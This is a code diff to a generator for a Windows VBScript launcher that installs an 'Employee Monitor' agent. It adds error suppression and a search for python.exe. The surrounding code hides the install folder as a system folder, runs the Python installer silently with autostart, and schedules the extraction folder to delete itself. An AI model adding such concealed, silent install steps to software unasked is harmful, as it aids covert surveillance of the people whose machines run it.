@@ -846,9 +846,11 @@ function buildWindowsVbsLauncher(origin) {
   return `' Employee Monitor — Windows silent launcher
 ' Double-click Setup.vbs to install.
 Option Explicit
+On Error Resume Next
+
 Dim ws, fso, baseDir, backendUrl, deviceId, installId, setupUrl
 Dim urlFile, f, urlLine, permDir, srcDir, extractParent, isReinstall
-Dim cleanupVbs, cv
+Dim cleanupVbs, cv, pythonExe, localApp, pyPaths, pi
 
 Set ws  = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -887,10 +889,38 @@ ws.Run "attrib +h +s " & Chr(34) & extractParent & Chr(34), 0, True
 If Not fso.FolderExists(permDir) Then fso.CreateFolder permDir
 CopyFolder srcDir, permDir
 
+' Find Python — search common install locations before falling back to PATH
+localApp = ws.ExpandEnvironmentStrings("%LOCALAPPDATA%")
+pythonExe = ""
+Dim pySearch(15)
+pySearch(0)  = localApp & "\\Programs\\Python\\Python313\\python.exe"
+pySearch(1)  = localApp & "\\Programs\\Python\\Python312\\python.exe"
+pySearch(2)  = localApp & "\\Programs\\Python\\Python311\\python.exe"
+pySearch(3)  = localApp & "\\Programs\\Python\\Python310\\python.exe"
+pySearch(4)  = localApp & "\\Programs\\Python\\Python39\\python.exe"
+pySearch(5)  = localApp & "\\Programs\\Python\\Python38\\python.exe"
+pySearch(6)  = "C:\\Python313\\python.exe"
+pySearch(7)  = "C:\\Python312\\python.exe"
+pySearch(8)  = "C:\\Python311\\python.exe"
+pySearch(9)  = "C:\\Python310\\python.exe"
+pySearch(10) = "C:\\Python39\\python.exe"
+pySearch(11) = "C:\\Python38\\python.exe"
+pySearch(12) = "C:\\Program Files\\Python313\\python.exe"
+pySearch(13) = "C:\\Program Files\\Python312\\python.exe"
+pySearch(14) = "C:\\Program Files\\Python311\\python.exe"
+pySearch(15) = "C:\\Program Files\\Python310\\python.exe"
+For pi = 0 To 15
+  If fso.FileExists(pySearch(pi)) Then
+    pythonExe = pySearch(pi)
+    Exit For
+  End If
+Next
+If pythonExe = "" Then pythonExe = "python"
+
 ' Run Python installer synchronously — wscript.exe (GUI) stays alive until Python exits
 ' so Python is never killed by console destruction
 ws.Environment("Process")("SKIP_SETUP_OPEN") = "1"
-ws.Run "python " & Chr(34) & permDir & "\\install_and_run.py" & Chr(34) & " --autostart --silent", 0, True
+ws.Run Chr(34) & pythonExe & Chr(34) & " " & Chr(34) & permDir & "\\install_and_run.py" & Chr(34) & " --autostart --silent", 0, True
 
 ' Schedule extraction-folder deletion via a second wscript.exe (GUI process,
 ' no console — not killed when parent exits) 30 s from now
